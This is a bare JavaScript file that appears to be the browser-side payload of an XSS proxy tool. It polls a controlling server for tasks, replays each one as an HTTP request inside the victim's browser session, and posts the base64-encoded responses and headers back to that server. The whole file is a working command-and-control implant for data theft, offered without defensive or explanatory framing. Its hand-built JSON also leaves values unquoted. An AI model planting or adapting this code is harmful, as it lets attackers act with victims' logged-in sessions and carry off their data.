function makeRequest(id, method, url, head, body){
    var target_http = new XMLHttpRequest();
    target_http.onreadystatechange = function() {
    
        if (target_http.readyState == 4 && target_http.status == 200) {
            var resp_body = btoa(target_http.responseText);
            var resp_headers = btoa(target_http.getAllResponseHeaders());
            var mygg_http = new XMLHttpRequest();
            mygg_http.onreadystatechange = function() {
                if (mygg_http.readyState == 4 && mygg_http.status == 200) {
                    console.log(mygg_http.responseText);
                }
            };
            mygg_http.open("POST", "https://127.0.0.1:443/responses", true);
            mygg_http.setRequestHeader("Content-Type","application/json");
            var obj = `{"id": ${id.toString()}, "url": ${url}, "status": ${target_http.status}, "headers": ${resp_headers}, "body": ${resp_body}}`
            mygg_http.send(obj);
        }
    };

    target_http.open(method, url, true);

    for (var key in head) {
        //console.log("Setting header: " + key + ": " + head[key]);
        target_http.setRequestHeader(key, head[key]) 
    }

    if (body != null) {
        target_http.send(body);
    } else {
        target_http.send();
    }
}
/*
function confirmRequests(requests) {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (xhttp.readyState == 4 && xhttp.status == 200) {
            console.log(xhttp.responseText);
        }
    };
    xhttp.open("POST", "http://127.0.0.1:5000/api/tasks/confirm", true);
    xhttp.setRequestHeader("Content-type","application/json");
    xhttp.send(requests);
    console.log("confirmed requests: ")
}
*/
function poll() {
    // make Ajax call here, inside the callback call:
    var mygg_http = new XMLHttpRequest();
    mygg_http.onreadystatechange = function () {
        if (mygg_http.readyState == 4 && mygg_http.status == 200) {
            console.log(mygg_http.responseText)
            var tasks = JSON.parse(mygg_http.responseText);
            //console.log(tasks)
            // confirmRequests(JSON.stringify(jsondata));
            for (var i in tasks){
                //console.log("ID: " + tasks[i].id + "##");
                console.log("TASK");
                console.log(tasks[i]);
                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
            }
        }
  };
  mygg_http.open("GET", "https://127.0.0.1:443/polling", true);
  mygg_http.send();
    
  setTimeout(poll, 7000);
}

poll();
